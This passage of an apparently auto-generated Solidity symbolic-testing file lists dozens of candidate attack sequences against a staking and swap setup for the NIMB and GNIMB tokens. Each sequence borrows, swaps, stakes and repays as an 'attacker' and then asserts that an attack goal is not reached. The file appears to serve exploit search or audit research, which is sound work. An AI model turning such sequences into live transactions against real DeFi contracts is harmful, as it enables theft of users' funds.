        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3016(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3017(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3018(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3019(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3020(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3021(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3022(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3023(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3024(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3025(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3026(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3027(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3028(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3029(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3030(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3031(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3032(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3033(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3034(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3035(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3036(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3037(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3038(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3039(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3040(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3041(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3042(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3043(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3044(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3045(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3046(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3047(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
